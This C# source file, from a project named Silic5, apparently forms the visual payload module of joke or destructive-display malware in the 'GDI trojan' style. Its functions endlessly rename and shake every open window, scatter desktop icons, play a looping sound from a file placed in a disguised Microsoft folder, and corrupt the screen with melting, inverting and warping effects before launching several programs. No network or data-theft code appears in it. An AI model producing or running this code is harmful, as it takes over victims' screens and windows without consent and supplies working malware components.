using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using static Silic5.Dll_Imports;

namespace Silic5
{
    public class gdi_payload
    {
        private SoundPlayer amb1;
        public void loop_titles()
        {
            Random rand;
            while (true)
            {
                var generator_h = new Generator();
                rand = new Random();
                IntPtr hwnd = Dll_Imports.GetTopWindow(Dll_Imports.GetDesktopWindow());
                hwnd = Dll_Imports.GetWindow(hwnd, Dll_Imports.GetWindowType.GW_HWNDLAST);
                do
                {
                    Dll_Imports.SetWindowText(hwnd, generator_h.GenerateToken(rand.Next(100)));
                } while ((hwnd = Dll_Imports.GetWindow(hwnd, Dll_Imports.GetWindowType.GW_HWNDPREV)) != IntPtr.Zero);
                Thread.Sleep(100);
            }
        }
        public void sound_effect()
        {
            Random rand;
            rand = new Random();
            string resources_path = @"C:\Program Files (x86)\Microsoft\Temp\";
            string[] snd_list = { resources_path + "noise2.wav" };
            if (File.Exists(snd_list[0])){
                amb1 = new SoundPlayer(snd_list[0]);
                amb1.PlayLooping();
            }          
        }
        public void gdi_payloads()
        {
            Thread.Sleep(5000);
            Stopwatch sw = Stopwatch.StartNew();
            bool processesStarted = false;
            int stage = 1;
            Random r;
            int x = Screen.PrimaryScreen.Bounds.Width; int y = Screen.PrimaryScreen.Bounds.Height;
            int left = Screen.PrimaryScreen.Bounds.Left, right = Screen.PrimaryScreen.Bounds.Right, top = Screen.PrimaryScreen.Bounds.Top, bottom = Screen.PrimaryScreen.Bounds.Bottom;
            POINT[] lppoint = new POINT[3];
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr mhdc = CreateCompatibleDC(hdc);
            IntPtr hbit = CreateCompatibleBitmap(hdc, x, y);
            IntPtr holdbit = SelectObject(mhdc, hbit);
            bool stage2Init = false;
            int[] melt = new int[x];
            while (true)
            {
                r = new Random();
                IntPtr handle = Dll_Imports.FindWindow("Progman", null);
                handle = Dll_Imports.FindWindowEx(handle, IntPtr.Zero, "SHELLDLL_DefView", null);
                handle = Dll_Imports.FindWindowEx(handle, IntPtr.Zero, "SysListView32", null);
                DirectoryInfo dirinfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                FileInfo[] finfo = dirinfo.GetFiles();
                for (int num = 0; num <= finfo.Length + 2; num++)
                {
                    int rand = r.Next(y);
                    if (stage == 1)
                    {
                        BitBlt(mhdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                        using (Graphics g = Graphics.FromHdc(mhdc))
                        using (SolidBrush brush = new SolidBrush(Color.FromArgb(18, 100, 10, 10)))
                        {
                            g.FillRectangle(brush, 0, 0, x, y);
                        }
                        AlphaBlend(hdc, r.Next(-7, 7), r.Next(-7, 7), x, y, mhdc, 0, 0, x, y, new BLENDFUNCTION(0, 0, 70, 0));
                        Dll_Imports.SendMessage(handle, Dll_Imports.LVM_SETITEMPOSITION, (IntPtr)num, Dll_Imports.MakeLParam(r.Next(x), r.Next(y)));
                        if (sw.ElapsedMilliseconds >= 30000)
                        {
                            stage = 2;
                            sw.Restart();
                        }
                    }
                    else if (stage == 2)
                    {
                        if (!stage2Init)
                        {
                            BitBlt(mhdc, 0, 0, x, y, hdc, 0, 0,
                                   TernaryRasterOperations.SRCCOPY);

                            stage2Init = true;
                        }

                        for (int i = 0; i < x; i++)
                        {
                            if (r.Next(2) == 0)    
                            melt[i] += r.Next(2, 8);
                            BitBlt(hdc, i, melt[i], 1, y - melt[i], mhdc, i, 0, TernaryRasterOperations.SRCCOPY);
                        }

                        if (sw.ElapsedMilliseconds >= 43000)
                        {
                            BitBlt(mhdc, 0, 0, x, y, hdc, 0, 0,
       TernaryRasterOperations.SRCCOPY);
                            stage = 3;
                            sw.Restart();
                        }
                    }
                    else if (stage == 3)
                    {
                        if (!processesStarted)
                        {
                            BitBlt(hdc, 0, 0, x, y, mhdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                            Process.Start("notepad.exe");
                            Process.Start("cmd.exe");
                            Process.Start("mspaint.exe");
                            processesStarted = true;
                        }
                        StretchBlt(hdc, (r.Next(2) == 1) ? -1 : 1, (r.Next(2) == 1) ? -1 : 1, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCAND);

                        if (sw.ElapsedMilliseconds >= 92000)
                        {
                            break;
                        }
                    }
                }
            }
        }
        public void gdi_old()
        {
            Stopwatch sw = Stopwatch.StartNew();
            int stage = 1;
            Random rnd = new Random();
            int w = Screen.PrimaryScreen.Bounds.Width;
            int h = Screen.PrimaryScreen.Bounds.Height;
            BLENDFUNCTION bf = new BLENDFUNCTION
            {
                BlendOp = 0,
                BlendFlags = 0,
                SourceConstantAlpha = 35,
                AlphaFormat = 0
            };

            while (true)
            {
                if (stage == 1)
                {
                    IntPtr hdc = GetDC(IntPtr.Zero);
                    IntPtr mhdc = CreateCompatibleDC(hdc);
                    IntPtr hbit = CreateCompatibleBitmap(hdc, w, h);
                    IntPtr holdbit = SelectObject(mhdc, hbit);
                    Graphics gfx = Graphics.FromHdc(mhdc);
                    double t = Environment.TickCount * 9999.99;
                    PatBlt(hdc, rnd.Next(w), rnd.Next(h), rnd.Next(50, 300), rnd.Next(50, 300), TernaryRasterOperations.PATPAINT);
                    BitBlt(hdc, 3, 0, w, h, hdc, 0, 0, TernaryRasterOperations.SRCINVERT);
                    BitBlt(hdc, -3, 0, w, h, hdc, 0, 0, TernaryRasterOperations.MERGECOPY);
                    BitBlt(hdc, 0, 3, w, h, hdc, 0, 0, TernaryRasterOperations.SRCPAINT);
                    bf.SourceConstantAlpha = 15;
                    BitBlt(mhdc, 0, 0, w, h, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                    AlphaBlend(hdc, 2, 2, w, h, mhdc, 0, 0, w, h, bf);
                    StretchBlt(hdc, rnd.Next(-50, 50), rnd.Next(-50, 50), w + rnd.Next(-100, 100), h + rnd.Next(-100, 100), hdc, 0, 0, w, h, TernaryRasterOperations.SRCCOPY);
                    int y = rnd.Next(h);
                    int hh = rnd.Next(10, 80);
                    StretchBlt(hdc, 0, y, w, hh, hdc, w, y, -w, hh, TernaryRasterOperations.SRCCOPY);
                    POINT[] pts = { new POINT { X = (int)(Math.Sin(t) * 40), Y = (int)(Math.Cos(t) * 20) }, new POINT { X = w + (int)(Math.Sin(t + 2) * 40), Y = (int)(Math.Sin(t) * 20) }, new POINT { X = (int)(Math.Cos(t + 1) * 40), Y = h + (int)(Math.Sin(t + 3) * 20) } };
                    int red = (int)(128 + 127 * Math.Sin(t));
                    int green = (int)(128 + 127 * Math.Sin(t + 2.094));
                    int blue = (int)(128 + 127 * Math.Sin(t + 4.188));
                    PlgBlt(hdc, pts, hdc, 0, 0, w, h, IntPtr.Zero, 0, 0);
                    gfx.Clear(Color.FromArgb(red, green, blue));
                    AlphaBlend(hdc, 0, 0, w, h, mhdc, 0, 0, w, h, bf);
                    if (sw.ElapsedMilliseconds >= 25000)
                    {
                        ReleaseDC(IntPtr.Zero, hdc);
                        DeleteDC(mhdc);
                        stage = 2;
                        sw.Restart();
                    }
                }
                else if (stage == 2)
                {
                    IntPtr hdc = GetDC(IntPtr.Zero);
                    IntPtr mhdc = CreateCompatibleDC(hdc);
                    IntPtr hbit = CreateCompatibleBitmap(hdc, w, h);
                    IntPtr holdbit = SelectObject(mhdc, hbit);
                    Graphics gfx = Graphics.FromHdc(mhdc);
                    double t = Environment.TickCount * 9999.99;
                    for (int y = 0; y < h; y += 2)
                    {
                        int dx = (int)(Math.Sin(t + y * 0.09) * 60 + Math.Cos(t * 0.7 + y * 0.02) * 30);
                        BitBlt(hdc, dx, y, w, 2, hdc, 0, y, TernaryRasterOperations.SRCCOPY);
                    }

                    for (int x = 0; x < w; x += 4)
                    {
                        int dy = (int)(Math.Cos(t + x * 0.09) * 40);
                        BitBlt(hdc, x, dy, 4, h, hdc, x, 0, TernaryRasterOperations.SRCCOPY);
                    }

                    StretchBlt(hdc, -8, -8, w + 16, h + 16, hdc, 0, 0, w, h, TernaryRasterOperations.SRCCOPY);
                    if (sw.ElapsedMilliseconds >= 30000)
                    {
                        break;
                    }
                    Thread.Sleep(1);
                    ReleaseDC(IntPtr.Zero, hdc);
                    gfx.Dispose();
                }
            }
        }
        public void window_shake()
        {
            Random rand;
            while (true)
            {
                rand = new Random();
                IntPtr hwnd = Dll_Imports.GetTopWindow(Dll_Imports.GetDesktopWindow());
                hwnd = Dll_Imports.GetWindow(hwnd, Dll_Imports.GetWindowType.GW_HWNDLAST);
                do
                {
                    Dll_Imports.RECT myrect;
                    Dll_Imports.GetWindowRect(hwnd, out myrect);
                    Dll_Imports.MoveWindow(hwnd, myrect.Left + rand.Next(-40, 41), myrect.Top + rand.Next(-40, 41),
                    myrect.Right - myrect.Left, myrect.Bottom - myrect.Top, true);
                } while ((hwnd = Dll_Imports.GetWindow(hwnd, Dll_Imports.GetWindowType.GW_HWNDPREV)) != IntPtr.Zero);
                if (payload_timer.extreme == false)
                    Thread.Sleep(1);
                else 
                    Thread.Sleep(1);
            }
        }
    }
}
